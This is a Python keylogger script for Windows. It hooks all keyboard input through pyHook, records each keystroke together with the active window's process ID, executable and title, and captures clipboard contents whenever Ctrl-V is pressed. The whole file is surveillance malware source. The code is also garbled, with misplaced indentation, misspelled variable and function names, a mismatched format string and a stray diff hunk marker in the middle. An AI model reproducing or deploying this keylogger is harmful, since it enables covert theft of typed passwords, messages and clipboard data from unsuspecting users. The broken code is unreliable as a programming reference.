#!/usr/bin/env python3

from ctypes import*
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    
    #get the handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    #locate ps id
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

#store the current ps id
process_id = "%d" % pid.value

#get the exe
executable = create_string_buffer("\x00" * 512)
h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

psapi.GetModuleBaseNameA(h_process,None,byref(executeable),512)

# read the title
window_title = create_string_buffer("\x00" * 512)
length = user32.GetWindowTextA(hwd, byref(window_title),512)

print()
#print headder to check if PS is correct
print("[ PID: %s - %s ]" % (process_id, executable.value, window_title.value))
print()

# close the handles @@ -53,7 +53,7 @@
kernel32.CloseHandle(hwd)
kernel32.CloseHandle(h_process)

def KeyStroke(event):

    global current_window

    #chk 2 c if trgt chgd windows
    if event.Window != current_window:
        current_window = event.WindowName
        get_cuerent_process()

    # if they prssed a std key
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        # if [Ctrl-V] get the value on the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % (pasted_value), end=' ')

        else:

            print("[%s]" % event.Key, end=' ')

    #pass execution to next hook registered
    return True

# create and register a hook mgr
kl   = pyhook.HookManager()
kl.KeyDown = KeyStroke

#register the hook and execute
kl.HookKeyboard()
pythoncom.PumpMessages()

